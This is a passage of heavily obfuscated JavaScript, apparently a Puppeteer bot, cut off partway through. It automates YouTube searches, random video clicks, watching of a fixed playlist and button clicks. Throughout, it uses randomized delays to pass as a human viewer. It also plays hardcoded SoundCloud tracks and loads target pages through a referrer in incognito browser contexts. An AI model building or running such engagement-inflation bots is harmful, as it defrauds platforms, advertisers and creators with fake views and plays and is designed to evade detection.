const X = b,
  W = d,
  V = c;

function getRandomInt(f, h) {
  const i = ceil(f);
  return floor(random() * (floor(h) - i + (-0x3 * -0x71 + 0xc3c + -0x2b6 * 0x5))) + i;
}
async function createPage(f, h) {
  let i = await f['newPage']();
  return await i['setDefault' + 'Navigation' + 'Timeout'](-0x2 * -0x6e2 + -0x727 * -0x1 + -0x99 * 0x23), await i['goto'](h, {
    'waitUntil': ['domcontent' + 'loaded'],
    'timeout': 0x0
  }), i;
}

function d(b, c) {
  const e = a();
  return d = function(f, g) {
    f = f - (-0x1f21 + 0x5 * 0x5e1 + 0x1bc);
    let h = e[f];
    return h;
  }, d(b, c);
}
async function standardGoto(f, h, i) {
  return await f['goto'](h, {
    'waitUntil': ['domcontent' + 'loaded'],
    'timeout': 0x0
  }), i ? await wait(-0x1479 + -0x157f + -0x4 * -0x27ca + (0x35 * 0x199 + 0x2bee * 0x1 + -0x1 * 0x4603) * random()) : await standardWaitForNetIdle(f), await wait(-0x178 * -0x9 + -0xe14 * 0x1 + 0x1464 + (-0x626 + 0xee2 + 0x1e54) * random()), -0x79 * -0x23 + 0x14f * -0x2 + 0x4a4 * -0x3;
}
async function standardWaitForNetIdle(f) {
  return await wait(0x4ff + 0x18bf + 0x1 * -0xa36), await f['waitForNet' + 'workIdle']({
    'idleTime': 0x1d4c,
    'timeout': 0x0
  }), 0x1b6d * -0x1 + 0x23a6 + -0x838 * 0x1;
}
async function randomWait() {
  return await wait(0x1 * 0x1750 + 0x208b * 0x1 + -0x2453 * 0x1 + (0x4 * 0x741 + -0x76a + -0x5 * 0x6a) * random()), -0x2030 + -0x6 * 0x3e + 0x21a5;
}
async function watchRandomFrontScreenVideo(f) {
  await f['evaluate'](() => {
    var i;
    (i = Array['from'](document['getElement' + 'sByClassNa' + 'me']('yt-core-im' + 'age--fill-' + 'parent-hei' + 'ght\x20yt-cor' + 'e-image--f' + 'ill-parent' + '-width\x20yt-' + 'core-image' + '\x20yt-core-i' + 'mage--cont' + 'ent-mode-s' + 'cale-aspec' + 't-fill\x20yt-' + 'core-image' + '--loaded'))['slice'](0x20bd + -0x1b88 + -0x535 * 0x1, 0xe * -0x31 + 0x1132 + -0xe7d), i[Math['floor'](Math['random']() * i['length'])])['setAttribu' + 'te']('id', '__scope');
  }), await randomWait(), await f['click']('#__scope'), await standardWaitForNetIdle(f);
  const h = await getMaxTime(f);
  return await wait(Math['min']((-0x830 * -0x7 + -0x1017 * 0x8 + 0x131c8) * getRandomInt(-0x38f + -0x108a + 0x1 * 0x141b, -0x85c + -0x2679 + 0x2eda), h)), 0x2 * -0xf62 + 0x3 * 0x2e5 + -0xb0b * -0x2;
}
async function getMaxTime(f) {
  return await f['evaluate'](() => {
    const h = {
      'Seconds': 0x3e8,
      'Minutes': 0xea60,
      'Hours': 0x36ee80,
      'Second': 0x3e8,
      'Minute': 0xea60,
      'Hour': 0x36ee80
    };
    let i = Array['from'](document['getElement' + 'sByClassNa' + 'me']('ytp-progre' + 'ss-bar'))['pop']()['ariaValueT' + 'ext'],
      j = 0x115 * -0x18 + 0x2448 + -0xa50;
    i = i['split'](i['includes']('of') ? '\x20of\x20' : ',\x20')[0x1fe6 + -0x1 * 0x1486 + -0xb5f]['split']('\x20');
    for (let k = -0x1a34 + 0xa31 + 0x1003; k < i['length']; k += 0x2 * 0x11c9 + -0x3 * 0x419 + -0x1745)
      j += i[k] * h[i[k + (-0x1 * -0x374 + 0xab + -0x41e)]];
    return j;
  });
}
async function anchorAndView(f) {
  log('goto\x20chann' + 'el\x20and\x20vie' + 'w\x20video\x20pr' + 'ocess...'), await standardGoto(f, channels['random']()), await f['click']('tp-yt-pape' + 'r-tab.styl' + 'e-scope:nt' + 'h-child(4)' + '\x20>\x20div:nth' + '-child(1)'), log('clicked\x20vi' + 'deo\x20stuff'), await standardWaitForNetIdle(f), log('page\x20netwo' + 'rk\x20idle\x20x2'), await f['evaluate'](() => {
    const j = Array['from'](document['querySelec' + 'torAll']('#contents'))['filter'](l => 'style-scop' + 'e\x20ytd-rich' + '-grid-row' == l['getAttribu' + 'te']('class'))['slice'](0x106 * 0x1d + -0x1477 + -0x931 * 0x1)['map'](l => Array['from'](l['children']))['flat'](0x6e4 + 0x2560 + -0x3 * 0xec1)['map'](l => l['childNodes'][0xec5 * 0x2 + -0x1136 * 0x2 + 0x1a1 * 0x3]['childNodes'][-0x1 * 0x1473 + -0x18fb + 0x2d6e]['childNodes'][-0x1 * -0xca1 + 0x113e + -0x1dde]['childNodes'][-0x209a + 0x1d74 * -0x1 + 0x3e0e]['childNodes'][0x12cc + -0x119b + -0x130]);
    var k;
    return (k = j)[Math['floor'](Math['random']() * k['length'])]['setAttribu' + 'te']('id', '__hookedVi' + 'dToWatch'), j['map'](l => l['href']);
  }), await wait(getRandomInt(0x1223 * -0x1 + -0x1 * 0x14c3 + 0x2ace, 0x244d + -0x88f * 0x2 + 0x59)), await f['click']('#__hookedV' + 'idToWatch'), await wait(0x2e0 * 0x23 + 0x7 * -0x21 + 0x1 * -0x2921);
  const h = await getMaxTime(f),
    i = Math['min']((-0x50f1 + -0x2a8 * 0x2 + 0x140a1 * 0x1) * getRandomInt(-0x2 * -0x1200 + 0x6c4 + -0x2ac2, 0x16a4 + 0x2f * -0x13 + 0x2 * -0x991), h);
  return await wait(i), 0x41 * -0x3e + -0x26e6 + -0x1237 * -0x3;
}
async function frontScreenActions(f) {
  return log('going\x20to\x20f' + 'ront\x20scree' + 'n\x20and\x20clic' + 'king\x20rando' + 'm\x20video...'), await standardWaitForNetIdle(f), await randomWait(), log('click\x20atte' + 'mpt...'), await f['evaluate'](() => {
    var h;
    (h = Array['from'](document['getElement' + 'sByClassNa' + 'me']('style-scop' + 'e\x20ytd-rich' + '-grid-row'))['filter'](i => 'contents' != i['id']), h[Math['floor'](Math['random']() * h['length'])])['children'][-0x1c9f + -0x7dc * -0x1 + 0x14c3]['children'][0x1 * -0x8d7 + -0x1 * -0x1fe7 + -0x290 * 0x9]['children'][0x4 * -0x847 + -0x1559 * 0x1 + 0x3675]['children'][0x156e + -0x1 * -0x1f39 + 0x3 * -0x118d]['children'][-0xb03 + -0x1fd6 + 0x2ad9]['setAttribu' + 'te']('id', 'gottemezez');
  }), await randomWait(), await f['click']('#gottemeze' + 'z'), await standardWaitForNetIdle(f), await watchRandomFrontScreenVideo(f), -0xe7 * -0x14 + -0x268 + 0x1 * -0xfa3;
}
async function searchAndView(f) {
  log('searching\x20' + 'youtube\x20re' + 'sults'), await randomWait(), await f['evaluate'](() => {
    let j = Array['from'](document['querySelec' + 'torAll']('#search'));
    document['getElement' + 'ById']('__searchBo' + 'xReal') || j['find'](k => 'INPUT' === k['tagName'])['setAttribu' + 'te']('id', '__searchBo' + 'xReal');
  }), await f['type']('#__searchB' + 'oxReal', searchTerms['random'](), {
    'delay': -0x1c31 + 0x184f + 0x446 + (0x1409 + 0x3 * 0xce9 + -0x3a92) * random()
  }), await wait(-0x61 * -0x25 + 0x13dd + -0xff7 * 0x2 + (-0xc * -0x2de + 0x943 * 0x3 + -0x1457 * 0x3) * random()), await f['click']('#search-ic' + 'on-legacy'), await async function j() {
    if (!await f['evaluate'](() => Array['from'](document['getElement' + 'sByTagName']('ytd-video-' + 'renderer'))['length']))
      return await j();
  }(), await standardWaitForNetIdle(f);
  let h = await f['evaluate'](() => {
    const k = {
        'seconds': 0x3e8,
        'minutes': 0xea60,
        'hours': 0x36ee80,
        'second': 0x3e8,
        'minute': 0xea60,
        'hour': 0x36ee80
      },
      l = (m = Array['from'](document['getElement' + 'sByTagName']('ytd-video-' + 'renderer'))['map'](p => p['childNodes'][0xf44 + 0xb * 0xe5 + -0x1919]['childNodes'][-0x3c3 + 0x38b * -0x3 + 0xe65]['childNodes'][-0x7 * -0x3b + 0x10bc + 0x1 * -0x1258]))[Math['floor'](Math['random']() * m['length'])];
    var m;
    const n = l['childNodes'][-0x60 * 0x48 + -0x1f16 + 0x3a1b]['childNodes'][0x111 * -0x13 + -0x1a35 + -0x2e78 * -0x1]['childNodes'][-0xe * 0x189 + 0x3 * 0xd5 + -0x3cd * -0x5]['ariaLabel'];
    return l['setAttribu' + 'te']('id', '__hookedVi' + 'dToClick'), l['scrollInto' + 'View'](),
      function(p) {
        let q = p['split'](',\x20')['map'](u => u['split']('\x20'))['flat'](0x19f9 + 0x5 * -0x4fd + -0x107 * 0x1),
          r = -0x18c4 + -0x1e97 + 0x17f * 0x25;
        for (let u = 0x207 * 0x13 + 0x35 * 0x9b + 0x1 * -0x469c; u < q['length']; u += 0xcc6 * 0x1 + -0x1 * -0x26ba + -0x337e)
          r += q[u] * k[q[u + (-0x1 * -0xa2b + 0x1eff + 0x101 * -0x29)]];
        return r;
      }(n);
  });
  await wait((0x6563 + -0x1 * -0xc87 + -0x3752) * Math['random']()), await f['click']('#__hookedV' + 'idToClick');
  let i = Math['min']((-0x139a2 * -0x1 + -0xae6b + 0x5f29) * getRandomInt(-0x1 * -0xae5 + 0xc * -0x264 + 0x11cc, 0x1f2e + -0x1 * -0x1320 + 0x1 * -0x3244), h + (0x5 * -0x251 + 0xfb * 0x4 + 0x1b31 * 0x1));
  return await wait(i), 0x93c + 0x23b3 + -0x2cee;
}
async function keyWatch(f) {
  log('standard\x20k' + 'eyWatch...'), await standardGoto(f, 'https://ww' + 'w.youtube.' + 'com/watch?' + 'v=' + hookPlaylistPoints['random']() + ('&list=PL7D' + '9Ps0wVt5cy' + 'nwDE_CPYb6' + 'aBUkYyfi-y'), 0x241 * -0x5 + 0x1 * -0x41b + 0xf60), log('clicking..' + '.'), await f['click']('#button\x20>\x20' + 'ytd-button' + '-renderer\x20' + '>\x20yt-butto' + 'n-shape\x20>\x20' + 'button\x20>\x20y' + 't-touch-fe' + 'edback-sha' + 'pe\x20>\x20div\x20>' + '\x20div.yt-sp' + 'ec-touch-f' + 'eedback-sh' + 'ape__fill'), await f['click']('#top-level' + '-buttons-c' + 'omputed\x20>\x20' + 'ytd-toggle' + '-button-re' + 'nderer\x20>\x20y' + 't-button-s' + 'hape\x20>\x20but' + 'ton\x20>\x20yt-t' + 'ouch-feedb' + 'ack-shape\x20' + '>\x20div\x20>\x20di' + 'v.yt-spec-' + 'touch-feed' + 'back-shape' + '__fill');
  const h = setInterval(async () => {
    log('executed\x20c' + 'leanup\x20int' + 'erval,\x20che' + 'ck\x20process' + '...'), await f['evaluate'](() => {
      setTimeout(() => {
        document['querySelec' + 'tor']('.ytp-large' + '-play-butt' + 'on')?.['offsetPare' + 'nt'] && document['querySelec' + 'tor']('.ytp-large' + '-play-butt' + 'on')['setAttribu' + 'te']('id', '__lllll');
      }, 0x22e0 + 0xf1 * 0x25 + -0x5 * 0xb99 + (-0x6 * 0x379 + 0x5 * 0x748 + -0xbaa * 0x1) * Math['random']());
    });
  }, 0x8 * -0x22a + -0x11bb * -0x1 + 0x1aed * 0x1);
  await wait(0x866 * 0x2c + -0x8abc2 + 0x37f7 * 0x36);
  try {
    await f['click']('#__lllll');
  } catch (i) {}
  return await wait((0xdbc7 * -0x1 + -0x62ab + 0x26a * 0xe5) * getRandomInt(0x1e9d * 0x1 + -0x2b * 0xcc + 0x3ab, 0x3f8 + -0x1d9c + 0x257 * 0xb)), clearInterval(h), 0x457 * 0x5 + -0x3 * -0x861 + 0x2ed5 * -0x1;
}
async function runYTModule(f, h) {
  const i = await createPage(f, 'https://ww' + 'w.youtube.' + 'com/');
  for (await randomWait();;) {
    let j = -0xbba + -0x16 * 0x73 + -0xc * -0x1cd;
    try {
      await standardWaitForNetIdle(i), await GlobalActions['random']()(i);
    } catch (k) {
      i['close']();
    }
    if (j)
      return 0x14ff + -0x14b4 + -0x4a;
    await randomWait();
  }
  return -0x6e5 + -0xf1d + 0x1603;
}

function fetchRandomSC() {
  const R = d;
  return Math['random']() <= -0x297 + -0x2289 + 0x2520 + 0.5 ? 'https://so' + 'undcloud.c' + 'om/22down/' + 'long-day-r' + 'emix-prod-' + 'unnecessar' + 'y-beats?si' + '=30458c9ce' + '44c4b4eaab' + '8a3eca1b3a' + '58e&utm_so' + 'urce=clipb' + 'oard&utm_m' + 'edium=text' + '&utm_campa' + 'ign=social' + '_sharing' : Math['random']() < 0x4bb + -0xd84 * 0x2 + 0x76f * 0x3 + 0.2 ? 'https://so' + 'undcloud.c' + 'om/22down/' + 'whatnot-de' + R(0x17) + 'c07128594b' + 'f6b3d049e1' + '680b972f&u' + 'tm_source=' + 'clipboard&' + 'utm_medium' + '=text&utm_' + 'campaign=s' + 'ocial_shar' + 'ing' : 'https://so' + 'undcloud.c' + 'om/22down/' + 'worried-ab' + 'out-the-tr' + 'uth-ft-rik' + 'anbeastly-' + 'nikkkq-cas' + 'ualcheater' + '?si=20d1c3' + '32655b4ef1' + '98a379eac0' + '05725b&utm' + '_source=cl' + 'ipboard&ut' + 'm_medium=t' + 'ext&utm_ca' + 'mpaign=soc' + 'ial_sharin' + 'g';
}
async function runGFModule(f, h) {
  async function i() {
    const at = {
      f: 0xf
    };
    if (doFlags['doSoundClo' + 'ud'] && Math['random']() >= -0x1d3f + 0x54d + 0x17f2 + 0.3) {
      const j = await f['createInco' + 'gnitoBrows' + 'erContext'](),
        k = await j['newPage']();
      let l = 0x23f4 + 0x7 * -0x175 + 0x19c1 * -0x1;
      if (await k['goto'](fetchRandomSC(), {
          'timeout': NETWORK_PATIENCE
        })['catch'](m => l++), l)
        return await k['close'](), await j['close'](), i();
      try {
        const m = await k['evaluate'](() => {
          const S = c;
          let n = document['querySelec' + 'tor']('#content\x20>' + '\x20div\x20>\x20div' + S(at.f) + 'hero\x20>\x20div' + '\x20>\x20div.ful' + 'lHero__for' + 'eground.fu' + 'llListenHe' + 'ro__foregr' + 'ound.sc-p-' + '4x\x20>\x20div.f' + 'ullHero__t' + 'itle\x20>\x20div' + '\x20>\x20div\x20>\x20d' + 'iv.soundTi' + 'tle__playB' + 'utton.soun' + 'dTitle__pl' + 'ayButtonHe' + 'ro.theme-l' + 'ight\x20>\x20a');
          n && 'Play' === n['textConten' + 't'] && n['click']();
        });
        await wait(0x457c + 0xe35 * -0x1 + 0x153 * 0x5b + getRandomInt(0x5e6b + 0xe * 0x4bd + -0x6629 * 0x1, 0x1 * 0x89c7 + 0x20c * -0x3b + 0x73 * 0xdf));
      } catch (n) {}
      return await k['close'](), await j['close'](), i();
    } {
      const {
        url: p,
        preRef: q
      } = scriptTargets['randomFlus' + 'h'](0x1022 + 0x63f + -0x1660 * 0x1), r = await f['createInco' + 'gnitoBrows' + 'erContext'](), s = await r['newPage']();
      let u = 0x1ed7 + 0x1 * -0x2094 + -0x1bd * -0x1;
      if (await s['goto'](q, {
          'timeout': NETWORK_PATIENCE
        })['catch'](w => u++), u)
        return await s['close'](), await r['close'](), i();
      const v = await s['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML');
      return log(v['slice'](0x29 * -0xef + 0x24c8 + 0x1 * 0x17f, 0x22e * 0x5 + 0x5d1 * -0x5 + 0x1261)), v['includes']('script-des' + 'cription') ? (log('p1'), await s['goto'](p, {
        'timeout': NETWORK_PATIENCE
      })['catch'](w => u++), u ? (await s['close'](), await r['close'](), i()) : (await new Promise(w => setTimeout(w, -0x1995 + 0x71 * -0x23 + 0x4 * 0xc36 + floor((-0x11b * 0x14 + -0x9 * 0xbf + 0x20bb) * random()))), log('p2'), log(await s['evaluate'](() => {
        const U = b;
        var w, x, y, z, A, B, C, D, E = 'object' == typeof window ? window : {},
          F = !E['JS_SHA1_NO' + '_NODE_JS'] && 'object' == typeof process && process['versions'] && process['versions']['node'];
        F && (E = global), w = ('0123456789' + 'abcdef')['split'](''), x = [
          -(0x1699572e + 0x20be47a * -0x6d + 0x14876f0c4),
          0xaf3348 + 0x3545 * -0x32d + 0x79f8d9,
          -0xaa08 + -0xab0d + -0xd67 * -0x23,
          -0x7 * -0x15e + 0x128 * -0x19 + -0x2 * -0x9eb
        ], y = [
          -0x67 * 0x25 + 0x1 * 0xf3b + -0x20 * 0x2,
          -0x1d * -0x97 + -0xefb + 0x2 * -0x108,
          0xdf4 + 0x233f + -0x312b,
          -0x1 * 0x110f + -0x1c4a + 0x37d * 0xd
        ], z = [
          'hex',
          'array',
          'digest',
          'arrayBuffe' + 'r'
        ], A = [], B = function(J) {
          return function(K) {
            return new G(-0x2 * 0x68 + -0x353 + 0x35 * 0x14)['update'](K)[J]();
          };
        }, C = function() {
          var J, K, L = B('hex');
          for (F && (L = D(L)), L['create'] = function() {
              return new G();
            }, L['update'] = function(M) {
              return L['create']()['update'](M);
            }, J = -0x3d * 0xe + 0x5 * -0x667 + 0x2359; J < z['length']; ++J)
            K = z[J], L[K] = B(K);
          return L;
        }, D = function(J) {
          var K = eval('require(\'crypto\');'),
            L = eval('require(\'buffer\')[\'Buffer\'];'),
            M = function(N) {
              if ('string' == typeof N)
                return K['createHash']('sha1')['update'](N, 'utf8')['digest']('hex');
              if (N['constructo' + 'r'] === ArrayBuffer)
                N = new Uint8Array(N);
              else {
                if (void(0x541 * -0x1 + 0x21 * 0x4 + 0x4bd * 0x1) === N['length'])
                  return J(N);
              }
              return K['createHash']('sha1')['update'](new L(N))['digest']('hex');
            };
          return M;
        };
        class G {
          constructor(J) {
              J ? (A[-0x8 * 0x3b + -0x7 * -0x310 + -0x1398] = A[0x6ad + -0x517 * -0x5 + -0x2010] = A[0x18c4 + 0x1f4b * -0x1 + 0x688] = A[-0xaca + 0x234c + -0x1880] = A[0x1b95 + -0x642 * -0x3 + -0x2e58 * 0x1] = A[0xd3d + -0x4f1 + -0x848] = A[-0x1880 + -0xacf * 0x3 + 0x38f2] = A[-0x2b8 + 0x1 * -0x1a29 + 0x1ce7] = A[0xf67 + -0x3fe + -0xb62] = A[0xe39 * 0x1 + 0xb85 + -0x19b6] = A[0x1 * 0x94d + -0x15a8 + 0xc64] = A[0x246f * -0x1 + 0x187 + 0x22f2] = A[-0x2 * 0x955 + -0x3a2 + 0x1657] = A[0x1aae + -0x3d3 * 0x5 + -0x783 * 0x1] = A[-0x17 * -0x62 + 0xc17 * 0x1 + -0x14d8] = A[-0xd4b * -0x1 + 0x234f + -0x308c] = A[0x742 * 0x1 + 0x90b + -0x15 * 0xc6] = 0x4be * 0x1 + -0x7b * 0x11 + 0x1 * 0x36d, this['blocks'] = A) : this['blocks'] = [
                0x1 * 0x1eb2 + 0x16ce + -0x2 * 0x1ac0,
                -0x3be * 0x5 + 0x15b * -0xb + 0x97 * 0x39,
                0x7 * -0x2fe + -0x1ec5 + 0x113d * 0x3,
                0x16ed * 0x1 + 0x1e19 + -0x3506,
                -0x1 * 0x1fd5 + 0x2 * -0x10e5 + 0x419f,
                0x1e32 + 0x2b5 + -0x20e7,
                0x6d1 + 0x1 * 0x1612 + -0x5c7 * 0x5,
                -0x159 + 0x87c + -0x723,
                0xe3 * -0x17 + 0x1d5 * -0x1 + 0x163a,
                0x1fa9 + 0x1 * 0x925 + -0x6 * 0x6cd,
                0x13de + -0x24e2 + 0x1104,
                -0x1df * -0x11 + 0x115e + -0x312d * 0x1,
                0x9b5 + 0x2 * -0x5e3 + -0x1 * -0x211,
                -0x13ed * 0x1 + 0x12d8 + -0x115 * -0x1,
                0x14b * 0x16 + -0x1797 + -0x4db,
                -0xb91 * 0x3 + 0x1345 * 0x2 + -0x3d7 * 0x1,
                -0x551 + 0xad * -0x17 + 0x14dc
              ], this['h0'] = -0x85066a19 + 0x2 * 0x8768999 + -0x3 * -0x491f7df8, this['h1'] = 0xd03c1 * 0xa + -0x9e3e3d * -0x265 + -0x8b9f8212, this['h2'] = -0x7299ab54 + 0x1689119 * 0xc7 + -0xcf4421d, this['h3'] = -0x18 * -0x2be8a1 + 0x9a20a43 * -0x1 + -0x1ab94e5 * -0xd, this['h4'] = 0x2 * -0x43faca37 + -0xd * 0x14810adc + 0x25656038a, this['block'] = this['start'] = this['bytes'] = this['hBytes'] = -0x10a6 + 0x21a5 + 0x10ff * -0x1, this['finalized'] = this['hashed'] = 0x923 + -0x39e + -0x9d * 0x9, this['first'] = 0x1677 + 0x1 * 0x1d9f + -0x3415;
            }
            ['update'](J) {
              var K, L, M, N, O, P;
              if (!this['finalized']) {
                for ((K = 'string' != typeof J) && J['constructo' + 'r'] === E['ArrayBuffe' + 'r'] && (J = new Uint8Array(J)), M = 0x20b1 * -0x1 + 0xb78 + 0x1539, O = J['length'] || -0x220a * 0x1 + 0x5 * -0x7a5 + -0x4843 * -0x1, P = this['blocks']; M < O;) {
                  if (this['hashed'] && (this['hashed'] = -0x17b0 + 0x1063 + -0x26f * -0x3, P[0x1 * 0x1122 + 0x588 + 0x3 * -0x78e] = this['block'], P[-0x1 * 0x2392 + -0x25f * 0x1 + -0x2601 * -0x1] = P[-0x3a * -0x7b + 0x247 * 0xb + 0x1a * -0x209] = P[0xb * -0x15 + 0x7d6 * -0x3 + 0x2f * 0x85] = P[0x1399 + -0xae + -0x12e8] = P[-0x2b9 * -0x7 + 0x2665 * 0x1 + -0x3970] = P[0x14 * -0x15d + 0x26ce + 0xb85 * -0x1] = P[-0x90a * 0x1 + -0x1ac6 + 0x23d6 * 0x1] = P[-0x1709 * 0x1 + -0x1985 + 0x3095] = P[-0x1b2a + -0xc8 + 0x1bfa] = P[0x1c93 + 0x5fb * -0x5 + 0x15d] = P[-0x13f5 + -0x3de + 0x17dd] = P[0x245f + 0x2ff + -0x2753 * 0x1] = P[-0x269e + -0xf * 0x283 + -0x4c57 * -0x1] = P[0x9ce * 0x3 + -0x2 * 0x1345 + 0x51 * 0x1d] = P[0x252a * -0x1 + -0x1af9 + 0x1 * 0x4031] = P[-0x16c2 + -0x59 * 0x15 + -0x1e1e * -0x1] = 0x1 * 0x135 + -0x11 * -0x13a + -0x160f), K) {
                    for (N = this['start']; M < O && N < 0x46f * 0x2 + 0xad2 + 0x137 * -0x10; ++M)
                      P[N >> 0x8 * -0x2cf + 0x12e6 + 0x2 * 0x1ca] |= J[M] << y[-0x205 * -0xb + -0xbf9 * 0x3 + -0x1 * -0xdb7 & N++];
                  } else {
                    for (N = this['start']; M < O && N < -0xfdd * 0x1 + -0x1 * -0x22b9 + -0x634 * 0x3; ++M)
                      (L = J['charCodeAt'](M)) < -0x1906 + -0x16 * 0x48 + -0x386 * -0x9 ? P[N >> -0x22d * -0xd + -0x4ae + -0x1799] |= L << y[0x37 * 0x3 + 0x1f25 + -0x1fc7 & N++] : L < 0x14d3 * -0x1 + -0x1b0 * -0x2 + 0x1973 ? (P[N >> 0x13b2 * -0x1 + -0x1 * -0x1526 + -0x172] |= (0x1689 + -0x1 * -0x33a + -0x1 * 0x1903 | L >> -0x18d7 * 0x1 + -0x249d + 0x3d7a) << y[-0x10 * -0x1be + 0x3cb * 0x2 + 0x339 * -0xb & N++], P[N >> 0x118c + -0x12a7 + 0x11d] |= (0x11b9 + -0x180e + 0x6d5 * 0x1 | -0x1954 + 0x1d16 + -0x1f * 0x1d & L) << y[0x22 * -0xe8 + 0x2173 + -0x2a0 & N++]) : L < 0xfa5b + 0x1490b + -0xa * 0x2457 || L >= -0x11fee + -0x366a + 0x23658 ? (P[N >> 0xc97 + 0xcdd + 0x1 * -0x1972] |= (-0x2b3 * -0xc + -0x1be6 + -0x39e * 0x1 | L >> -0x1558 + -0x25 * 0x13 + -0xa7 * -0x25) << y[0x1 * -0x41f + 0x1f0b + -0x1ae9 & N++], P[N >> -0x110a * 0x1 + -0x134 * 0x8 + 0x1aac] |= (0x7 * -0x1de + -0x2 * 0x1269 + 0x4b * 0xac | L >> -0x15d + -0x4 * -0x911 + -0x22e1 & -0x515 + -0x1305 + 0x1 * 0x1859) << y[-0xe * 0xb3 + -0x16e8 * 0x1 + 0x20b5 & N++], P[N >> 0x1ad5 + 0xb1e + -0x25f1] |= (-0xd * 0x7e + 0x26c9 + -0x1 * 0x1fe3 | -0xa0b * -0x2 + -0x1b60 + 0x1 * 0x789 & L) << y[-0x1 * -0xe86 + -0x15dd + -0x3ad * -0x2 & N++]) : (L = -0x1 * 0x32d1 + 0x4788 + 0xeb49 + ((0x7 * 0xd3 + -0x1dff + -0x121 * -0x19 & L) << -0xa17 + 0xb * 0x137 + -0x17 * 0x24 | -0x1337 + 0x4a5 + 0x1291 & J['charCodeAt'](++M)), P[N >> -0xe31 * -0x2 + 0x18 * 0x1a + 0x1d0 * -0x11] |= (-0x1fb7 + 0x1 * -0x61 + 0x12e * 0x1c | L >> -0xa3 * -0x19 + -0x10 * 0xb5 + 0x3 * -0x183) << y[-0x20af + 0x4ab * 0x3 + -0x3bd * -0x5 & N++], P[N >> 0xe1e * -0x2 + 0x13 * -0x30 + -0x76 * -0x45] |= (-0x17c7 + 0x20a7 + 0x430 * -0x2 | L >> 0x9 * 0x106 + -0x21b + 0xd * -0x8b & -0x1 * 0x238a + -0x25dd + 0x49a6) << y[-0x1e1a + -0x100e + 0x2e2b & N++], P[N >> 0xa92 + -0x10e0 + 0x4 * 0x194] |= (0xa8 * -0x1 + 0x742 * 0x4 + -0x1be0 | L >> -0x51 + -0xa2b + -0xa82 * -0x1 & 0x7 * -0x155 + -0x101 * -0x1d + 0x138b * -0x1) << y[0x7 * 0x245 + 0x1 * -0x2709 + 0x34f * 0x7 & N++], P[N >> 0x77 * 0x31 + 0x2474 + 0x1 * -0x3b39] |= (0x1400 + -0x60d * 0x5 + -0x1 * -0xac1 | 0xf * 0x3c + -0x1b4c + 0x1 * 0x1807 & L) << y[-0x1176 + -0x1 * 0x8c3 + 0x2 * 0xd1e & N++]);
                  }
                  this['lastByteIn' + 'dex'] = N, this['bytes'] += N - this['start'], N >= -0x103d + -0x2ac * 0xc + 0x308d ? (this['block'] = P[-0x8c3 * 0x1 + 0x913 + 0x40 * -0x1], this['start'] = N - (0x2204 + -0x1 * -0x2519 + -0x46dd), this['hash'](), this['hashed'] = 0x1c6f + -0x163b + -0x633) : this['start'] = N;
                }
                return this['bytes'] > -0xb9116cb7 + -0x4072 * -0x17276 + -0x2e0ee * -0x78d3 && (this['hBytes'] += this['bytes'] / (0x2b4487e * -0x82 + -0x197664e18 * -0x1 + 0xc82681e4) << -0xcc3 * 0x1 + -0x20fc + 0x2dbf, this['bytes'] = this['bytes'] % (-0x1 * 0x136b0f464 + -0x5620d2a8 + 0x28cd1c70c)), this;
              }
            }
            ['finalize']() {
              const T = b;
              if (!this['finalized']) {
                this['finalized'] = -0x18a + -0x1e5f * 0x1 + 0xa * 0x331;
                var J = this['blocks'],
                  K = this['lastByteIn' + 'dex'];
                J[0x17c + -0x19e + 0x32] = this['block'], J[K >> 0x3 * -0x5b5 + 0x26d4 + -0x15b3] |= x[-0x1026 + -0x7ec * 0x1 + 0x1815 & K], this['block'] = J[0x2419 + -0x5e * 0x40 + -0xc89 * 0x1], K >= -0x1 * 0x9d5 + -0x1 * 0x225f + -0x1636 * -0x2 && (this['hashed'] || this['hash'](), J[-0x808 + -0x1df * 0x14 + 0x2d74] = this['block'], J[-0x1 * 0x1765 + -0x1967 + 0x30dc] = J[-0x6d8 + -0x4d1 + 0x1 * 0xbaa] = J[0x60d * -0x5 + 0xe99 + 0xfaa] = J[0x1 * -0x1621 + -0x21b3 * -0x1 + 0xb * -0x10d] = J[0xbb7 * 0x2 + -0x35c * 0xb + 0xd8a] = J[-0x1154 * 0x1 + -0xdb2 * -0x1 + -0x11 * -0x37] = J[0x22c8 + 0x2129 + 0x43eb * -0x1] = J[-0x16e0 + 0x3 * 0x3b + -0xb1b * -0x2] = J[0x32c + -0xc3 + -0x261] = J[-0x486 + 0x689 + -0x1fa] = J[0x741 * 0x1 + -0x20ad + 0x1976] = J[-0x1d * -0xe5 + -0x71e * -0x1 + -0x1 * 0x2104] = J[0xd * 0x2dc + -0x7db * 0x1 + -0x1d45] = J[-0x17 * -0x10 + -0x560 + 0x3fd] = J[0x1 * 0x26da + -0x1 * 0xb5f + -0x1b6d] = J[0x2 * -0x1173 + -0x2 * 0x5e + 0x23b1] = -0x14e5 + 0x143f + -0xa6 * -0x1), J[-0x8a1 + 0x478 + 0x1 * 0x437] = this[T(0x1e, 'k7fy')] << -0x1 * -0x24cc + 0x11a + -0x25e3 | this['bytes'] >>> 0x1 * 0xbed + 0x2 * -0x439 + -0x35e, J[-0x3 * -0x5ff + 0x217d + -0x336b] = this['bytes'] << 0x1067 * 0x1 + -0x535 * -0x3 + -0x2003, this['hash']();
              }
            }
            ['hash']() {
              var J, K, L = this['h0'],
                M = this['h1'],
                N = this['h2'],
                O = this['h3'],
                P = this['h4'],
                Q = this['blocks'];
              for (J = 0x1 * 0x146f + -0x1 * 0xc5 + -0xd * 0x182; J < -0x53c * 0x5 + 0x1f9f * 0x1 + -0x523; ++J)
                K = Q[J - (-0x14a1 * -0x1 + 0xd15 + -0x1 * 0x21b3)] ^ Q[J - (-0x1 * 0x190c + -0x6da + -0xff7 * -0x2)] ^ Q[J - (0xea3 + 0xefa + 0x1 * -0x1d8f)] ^ Q[J - (-0x4ab + 0x115 * -0x5 + -0x16 * -0x76)], Q[J] = K << 0x7a * 0x4 + 0x2165 + 0x6 * -0x5e2 | K >>> 0xe91 * 0x1 + -0x10 * -0x167 + -0x1 * 0x24e2;
              for (J = -0x82 * 0x22 + -0x1 * -0xf59 + -0x1 * -0x1eb; J < 0x2132 + -0xac7 + -0x1657 * 0x1; J += -0x99e + -0x1805 + -0x59c * -0x6)
